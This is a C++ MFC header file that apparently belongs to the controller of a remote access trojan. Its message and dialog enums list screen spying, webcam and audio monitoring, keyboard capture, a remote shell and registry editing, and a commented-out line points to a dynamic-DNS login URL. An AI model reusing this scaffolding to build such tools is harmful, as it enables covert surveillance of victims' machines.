// stdafx.h : include file for standard system include files,
//  or project specific include files that are used frequently, but
//      are changed infrequently
//

#if !defined(AFX_STDAFX_H__CF5847E1_BF32_466B_B654_43877EB562DA__INCLUDED_)
#define AFX_STDAFX_H__CF5847E1_BF32_466B_B654_43877EB562DA__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#define VC_EXTRALEAN		// Exclude rarely-used stuff from Windows headers

#include <afxwin.h>         // MFC core and standard components
#include <afxext.h>         // MFC extensions
#include <afxdisp.h>        // MFC Automation classes
#include <afxdtctl.h>		// MFC support for Internet Explorer 4 Common Controls
#ifndef _AFX_NO_AFXCMN_SUPPORT
#include <afxcmn.h>			// MFC support for Windows Common Controls
#endif // _AFX_NO_AFXCMN_SUPPORT
#include "macros.h"
#include "include\IOCPServer.h"
//#include "DateStrcut.h"
#include <XTToolkitPro.h>
#include "afxinet.h"
#include "shlwapi.h"
#pragma comment(lib,"shlwapi.lib")

//#include <DbgHelp.h>
#pragma comment(lib,"DbgHelp.lib")

// extern POSTXML mPostXml;
// extern char LoginUserName[MAX_PATH];
// extern char LoginPassWord[MAX_PATH];
// extern char LastLoginTime[MAX_PATH];
// extern char Datetime[MAX_PATH];
#define WM_LOGIN_PASS 10001
#define WM_LOG 10002
#define WM_PROGRESS 10003

//#define ServerHost "http://niubi1.f3322.net/CheckLogin.php"  
enum 
{
		WM_ADDTOLIST = WM_USER + 102,	// 添加到列表视图中
		WM_REMOVEFROMLIST,				// 从列表视图中删除
		WM_OPENMANAGERDIALOG,			// 打开一个文件管理窗口
		WM_OPENSCREENSPYDIALOG,			// 打开一个屏幕监视窗口
		WM_OPENWEBCAMDIALOG,			// 打开摄像头监视窗口
		WM_OPENAUDIODIALOG,				// 打开一个语音监听窗口
		WM_OPENPSLISTDIALOG,			// 打开进程管理窗口
		WM_OPENSHELLDIALOG,				// 打开shell窗口
		WM_ADDFINDGROUP,				// 上线时查找分组
		WM_MODIFYLIST,
		WM_OPENBUILDDIALOG,             // 生成窗口
		WM_OPENKEYBOARDDIALOG,
		WM_OPENSERVICEDIALOG,
		WM_OPENREGEDITDIALOG,
		WM_OPENTEXTCHATDIALOG,
		WM_OPENPROXYMAPDIALOG,
		WM_OPENPQQBOXDIALOG,
		WM_OPENCHATDIALOG,
		WM_WRITEQQNUM,
		WM_OPENSYSINFODIALOG,			// 打开服务器信息窗口
		WM_OPENSCREENSPYDIALOG1,			// 打开服务器信息窗口
		WM_OPENTEMPSYSINFO,				//  临时系统信息

		//////////////////////////////////////////////////////////////////////////
		FILEMANAGER_DLG = 1,
		SCREENSPY_DLG,
		SCREENSPY_DLG1,
		WEBCAM_DLG,
		AUDIO_DLG,
		SYSTEM_DLG,
		SHELL_DLG,
		KEYBOARD_DLG,
		SERVICE_DLG,
		REGEDIT_DLG,
		CHAT_DLG,
		PROXYMAP_DLG,
		GETDAT_DLG,
		SYSINFO_DLG
};
typedef struct 
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;
#define MAKEINT64(low, high) ((unsigned __int64)(((DWORD)(low)) | ((unsigned __int64)((DWORD)(high))) << 32))

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_STDAFX_H__CF5847E1_BF32_466B_B654_43877EB562DA__INCLUDED_)
